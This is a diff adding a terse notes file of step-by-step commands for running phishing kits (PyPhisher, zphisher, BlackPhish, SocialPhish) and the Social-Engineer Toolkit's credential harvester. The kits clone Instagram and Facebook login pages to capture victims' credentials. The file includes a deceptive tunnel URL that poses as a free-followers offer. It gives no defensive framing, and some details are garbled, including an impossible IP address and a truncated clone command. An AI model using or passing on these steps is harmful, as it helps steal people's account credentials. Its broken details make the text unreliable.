@@ -1,0 +1,57 @@
+             Successfully phishing attack by 
+---Pyphisher---
+sudo apt update
+apt install curl
+apt install openssl
+sudo apt intstall git python3 php openssh-client -y
+git clone ....
+ls
+cd PyPhisher
+ls
+pip install -r files/requirements.txt
+python3 pyphisher.py
+
+-----------------------zphisher-------------------------------------
+
+git clone git://github.com/htr-tech/zphisher.git
+cd zphisher
+bash zphisher.sh
+select option -2 for instagram
+select option -1 for tradition login page
+select option -3 Cloudflared 
+wait few minutes after create link 
+URL 2 : http://get-unlimited-followers-for-instagram@supplement-tier-reception-modification.trycloudflare.com
+
+
+
+
+-----------------------BlackPhish------------------------------
+
+git clone https://github.com/iinc0gnit0/BlackPhish
+cd BlackPhish
+./install.sh
+sudo python3 blackphish.py
+
+open webbrowser tpye :- http://127.0.0.1
+
+
+
+
+-------------------------SocialPhish-------------------------------
+social phishing attack
+git clone https://github.com/xHak9x/SocialPhish.git
+cd SocialPhish
+chmod +x socialphish.sh
+./socialphish.sh
+
+
+
+
+-----------------settoolkit---------------------------------
+1)setoolkit
+2)Social Engineerig
+3)Website Attack Vector
+4)Credintail Harvester Attack methodU
+   2) Site Cloner
+5)Ip Address:195.168.125.358
+6)Enter the website for clone : www.myfacebook.com
